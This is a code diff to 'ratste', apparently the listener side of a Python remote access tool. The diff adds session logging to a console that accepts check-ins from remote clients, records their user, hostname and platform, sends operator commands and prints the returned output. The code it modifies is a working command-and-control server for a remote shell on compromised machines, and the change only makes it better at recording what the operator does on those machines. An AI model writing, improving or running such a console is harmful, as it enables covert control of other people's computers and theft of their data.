@@ -23,10 +23,11 @@ __author__ = "https://github.com/StefanoRatto/"
 __license__ = "GPLv3"
 __version__ = "1.0.0"
 
-from platform import python_build
 import socket
 import sys
 import base64
+import logging
+import datetime
 
 try:
     LHOST = str(sys.argv[1])
@@ -61,8 +62,14 @@ def main():
         print 'ratste > network error, exiting...'
         sys.exit(1)
 
+    log_file = 'logs/ratste-{}.log'.format(datetime.datetime.now()).replace(" ", "_")
+    logging.basicConfig(filename=log_file, level=logging.INFO)
+
     print 'ratste > server listening on {}:{}'.format(LHOST, LPORT)
+    logging.info('ratste > server listening on {}:{}'.format(LHOST, LPORT))
+    print 'ratste > session log file: {}'.format(log_file)
     print 'ratste > type "quit" or ctrl-c to exit'
+    logging.info('ratste > type "quit" or ctrl-c to exit')
 
     connection, _ = tcp_socket.accept()
 
@@ -71,12 +78,19 @@ def main():
     platform, hostname, user, version, arch = client_info.split('|')
 
     print 'ratste > check-in by {}@{}'.format(user, hostname)
+    logging.info('ratste > check-in by {}@{}'.format(user, hostname))
     print 'Platform: {}'.format(platform)
+    logging.info('Platform: {}'.format(platform))
     print 'Version: {}'.format(version)
+    logging.info('Version: {}'.format(version))
     print 'Architecture: {}\n'.format(arch)
+    logging.info('Architecture: {}\n'.format(arch))
 
     while True:
-        command = raw_input('ratste ~ {}@{} > '.format(user, hostname)).rstrip()
+        command = raw_input('ratste ~ {}@{} > '.format(user, 
+            hostname)).rstrip()
+        logging.info(str('ratste ~ {}@{} > {}'.format(user, hostname, 
+            command)).rstrip())
 
         # allow noop
         if command == '':
@@ -92,6 +106,7 @@ def main():
 
         data = decode(connection.recv(4096))
         print data
+        logging.info(data)
 
 if __name__ == '__main__':
     main()
